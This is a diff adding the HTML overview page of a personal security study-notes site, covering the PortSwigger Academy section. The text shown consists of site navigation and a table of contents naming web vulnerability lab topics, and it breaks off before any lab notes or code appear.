@@ -1,0 +1,1809 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Digital scrapbook of various security topics">
+      
+      
+        <meta name="author" content="Rob Gillen">
+      
+      
+      <link rel="icon" href="../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.3.0, mkdocs-material-8.2.15">
+    
+    
+      
+        <title>Overview - Vulnerability Science Study Notes</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.c382b1dc.min.css">
+      
+        
+        <link rel="stylesheet" href="../assets/stylesheets/palette.cc9b2e1e.min.css">
+        
+          
+          
+          <meta name="theme-color" content="#757575">
+        
+      
+    
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto+Regular:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto Regular";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="" data-md-color-primary="grey" data-md-color-accent="indigo">
+  
+    
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#portswigger-academy" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../index.html" title="Vulnerability Science Study Notes" class="md-header__button md-logo" aria-label="Vulnerability Science Study Notes" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Vulnerability Science Study Notes
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Overview
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" aria-label="Clear" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://code.ornl.gov/ru7/study" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.1.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    Code
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../index.html" title="Vulnerability Science Study Notes" class="md-nav__button md-logo" aria-label="Vulnerability Science Study Notes" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    Vulnerability Science Study Notes
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://code.ornl.gov/ru7/study" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.1.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    Code
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../index.html" class="md-nav__link">
+        Overview
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2" type="checkbox" id="__nav_2" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2">
+          Core Skills
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Core Skills" data-md-level="1">
+        <label class="md-nav__title" for="__nav_2">
+          <span class="md-nav__icon md-icon"></span>
+          Core Skills
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_1" type="checkbox" id="__nav_2_1" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2_1">
+          Assembly
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Assembly" data-md-level="2">
+        <label class="md-nav__title" for="__nav_2_1">
+          <span class="md-nav__icon md-icon"></span>
+          Assembly
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../skills/assembly/ppc.html" class="md-nav__link">
+        PowerPC
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_2" type="checkbox" id="__nav_2_2" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2_2">
+          Languages
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Languages" data-md-level="2">
+        <label class="md-nav__title" for="__nav_2_2">
+          <span class="md-nav__icon md-icon"></span>
+          Languages
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../skills/languages/cpp.html" class="md-nav__link">
+        C++
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_3" type="checkbox" id="__nav_2_3" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2_3">
+          Password Cracking
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Password Cracking" data-md-level="2">
+        <label class="md-nav__title" for="__nav_2_3">
+          <span class="md-nav__icon md-icon"></span>
+          Password Cracking
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../skills/passwords/index.html" class="md-nav__link">
+        Overview
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../skills/passwords/searchspace.html" class="md-nav__link">
+        Search Space
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../skills/passwords/hashcat.html" class="md-nav__link">
+        HashCat
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../skills/passwords/john.html" class="md-nav__link">
+        John the Ripper
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_4" type="checkbox" id="__nav_2_4" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2_4">
+          Reverse Engineering
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Reverse Engineering" data-md-level="2">
+        <label class="md-nav__title" for="__nav_2_4">
+          <span class="md-nav__icon md-icon"></span>
+          Reverse Engineering
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../skills/re/ghidra.html" class="md-nav__link">
+        Ghidra
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../skills/re/virtual_funcs.html" class="md-nav__link">
+        Virtual Functions
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../skills/webexploit.html" class="md-nav__link">
+        Website Exploitation
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3" type="checkbox" id="__nav_3" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3">
+          Capture The Flag (CTF)
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Capture The Flag (CTF)" data-md-level="1">
+        <label class="md-nav__title" for="__nav_3">
+          <span class="md-nav__icon md-icon"></span>
+          Capture The Flag (CTF)
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="htb.html" class="md-nav__link">
+        Hack The Box (HTB)
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="picoCTF.html" class="md-nav__link">
+        picoCTF
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="rzeroctf.html" class="md-nav__link">
+        RingZer0 Team Online CTF
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4" type="checkbox" id="__nav_4" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_4">
+          PortSwigger Academy
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="PortSwigger Academy" data-md-level="1">
+        <label class="md-nav__title" for="__nav_4">
+          <span class="md-nav__icon md-icon"></span>
+          PortSwigger Academy
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          Overview
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="portswigger.html" class="md-nav__link md-nav__link--active">
+        Overview
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#topics" class="md-nav__link">
+    Topics
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#cross-site-request-forgery-csrf" class="md-nav__link">
+    Cross-site Request Forgery (CSRF)
+  </a>
+  
+    <nav class="md-nav" aria-label="Cross-site Request Forgery (CSRF)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#csrf-vulnerability-with-no-defenses" class="md-nav__link">
+    CSRF vulnerability with no defenses
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#clickjacking" class="md-nav__link">
+    Clickjacking
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#dom-based-vulnerabilities" class="md-nav__link">
+    DOM-based Vulnerabilities
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#cross-origin-resource-sharing-cors" class="md-nav__link">
+    Cross-Origin Resource Sharing (CORS)
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xml-external-entity-xxe-injection" class="md-nav__link">
+    XML External Entity (XXE) injection
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#server-side-request-forgery-ssrf" class="md-nav__link">
+    Server-Side Request Forgery (SSRF)
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#http-request-smuggling" class="md-nav__link">
+    HTTP Request Smuggling
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#server-side-template-injection" class="md-nav__link">
+    Server-Side Template Injection
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#directory-traversal" class="md-nav__link">
+    Directory Traversal
+  </a>
+  
+    <nav class="md-nav" aria-label="Directory Traversal">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#file-path-traversal-simple-case" class="md-nav__link">
+     File path traversal, simple case
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#file-path-traversal-traversal-sequences-blocked-with-absolute-path-bypass" class="md-nav__link">
+     File path traversal, traversal sequences blocked with absolute path bypass
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#file-path-traversal-traversal-sequences-stripped-non-recursively" class="md-nav__link">
+     File path traversal, traversal sequences stripped non-recursively
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#file-path-traversal-traversal-sequences-stripped-with-superfluous-url-decode" class="md-nav__link">
+     File path traversal, traversal sequences stripped with superfluous URL-decode
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#file-path-traversal-validation-of-start-of-path" class="md-nav__link">
+     File path traversal, validation of start of path
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#file-path-traversal-validation-of-file-extension-with-null-byte-bypass" class="md-nav__link">
+     File path traversal, validation of file extension with null byte bypass
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#authentication" class="md-nav__link">
+    Authentication
+  </a>
+  
+    <nav class="md-nav" aria-label="Authentication">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#username-enumeration-via-different-responses" class="md-nav__link">
+     Username enumeration via different responses
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#username-enumeration-via-subtly-different-responses" class="md-nav__link">
+     Username enumeration via subtly different responses
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#username-enumeration-via-response-timing" class="md-nav__link">
+     Username enumeration via response timing
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2fa-simple-bypass" class="md-nav__link">
+     2FA simple bypass
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#password-reset-broken-logic" class="md-nav__link">
+     Password reset broken logic
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#websockets" class="md-nav__link">
+    WebSockets
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#web-cache-poisoning" class="md-nav__link">
+    Web Cache Poisoning
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#insecure-deserialization" class="md-nav__link">
+    Insecure Deserialization
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#information-disclosure" class="md-nav__link">
+    Information Disclosure
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#business-logic-vulnerabilities" class="md-nav__link">
+    Business Logic Vulnerabilities
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#http-host-header-attacks" class="md-nav__link">
+    HTTP Host Header Attacks
+  </a>
+  
+    <nav class="md-nav" aria-label="HTTP Host Header Attacks">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#basic-password-reset-poisoning" class="md-nav__link">
+    Basic Password Reset Poisoning
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#oauth-authentication" class="md-nav__link">
+    OAuth Authentication
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ps-accesscontrol.html" class="md-nav__link">
+        Access Control
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ps-xss.html" class="md-nav__link">
+        Cross-Site Scripting
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ps-oscmdi.html" class="md-nav__link">
+        OS Command Injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ps-sqi.html" class="md-nav__link">
+        SQL Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_5" type="checkbox" id="__nav_5" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_5">
+          Linux
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Linux" data-md-level="1">
+        <label class="md-nav__title" for="__nav_5">
+          <span class="md-nav__icon md-icon"></span>
+          Linux
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../linux/lfs.html" class="md-nav__link">
+        Linux From Scratch
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_6" type="checkbox" id="__nav_6" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_6">
+          Test Beds
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Test Beds" data-md-level="1">
+        <label class="md-nav__title" for="__nav_6">
+          <span class="md-nav__icon md-icon"></span>
+          Test Beds
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../testbed/index.html" class="md-nav__link">
+        Portable Testbed
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../testbed/lanturtle.html" class="md-nav__link">
+        Lan Turtle
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../testbed/pktsquirrel.html" class="md-nav__link">
+        Packet Squirrel
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../testbed/virtual_machines.html" class="md-nav__link">
+        Virtual Machine Hosting
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../testbed/vpn.html" class="md-nav__link">
+        VPN
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_7" type="checkbox" id="__nav_7" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_7">
+          Miscellany
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Miscellany" data-md-level="1">
+        <label class="md-nav__title" for="__nav_7">
+          <span class="md-nav__icon md-icon"></span>
+          Miscellany
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../changelog.html" class="md-nav__link">
+        Change Log
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../license.html" class="md-nav__link">
+        License
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#topics" class="md-nav__link">
+    Topics
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#cross-site-request-forgery-csrf" class="md-nav__link">
+    Cross-site Request Forgery (CSRF)
+  </a>
+  
+    <nav class="md-nav" aria-label="Cross-site Request Forgery (CSRF)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#csrf-vulnerability-with-no-defenses" class="md-nav__link">
+    CSRF vulnerability with no defenses
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#clickjacking" class="md-nav__link">
+    Clickjacking
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#dom-based-vulnerabilities" class="md-nav__link">
+    DOM-based Vulnerabilities
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#cross-origin-resource-sharing-cors" class="md-nav__link">
+    Cross-Origin Resource Sharing (CORS)
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xml-external-entity-xxe-injection" class="md-nav__link">
+    XML External Entity (XXE) injection
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#server-side-request-forgery-ssrf" class="md-nav__link">
+    Server-Side Request Forgery (SSRF)
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#http-request-smuggling" class="md-nav__link">
+    HTTP Request Smuggling
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#server-side-template-injection" class="md-nav__link">
+    Server-Side Template Injection
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#directory-traversal" class="md-nav__link">
+    Directory Traversal
+  </a>
+  
+    <nav class="md-nav" aria-label="Directory Traversal">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#file-path-traversal-simple-case" class="md-nav__link">
+     File path traversal, simple case
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#file-path-traversal-traversal-sequences-blocked-with-absolute-path-bypass" class="md-nav__link">
+     File path traversal, traversal sequences blocked with absolute path bypass
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#file-path-traversal-traversal-sequences-stripped-non-recursively" class="md-nav__link">
+     File path traversal, traversal sequences stripped non-recursively
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#file-path-traversal-traversal-sequences-stripped-with-superfluous-url-decode" class="md-nav__link">
+     File path traversal, traversal sequences stripped with superfluous URL-decode
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#file-path-traversal-validation-of-start-of-path" class="md-nav__link">
+     File path traversal, validation of start of path
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#file-path-traversal-validation-of-file-extension-with-null-byte-bypass" class="md-nav__link">
+     File path traversal, validation of file extension with null byte bypass
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#authentication" class="md-nav__link">
+    Authentication
+  </a>
+  
+    <nav class="md-nav" aria-label="Authentication">
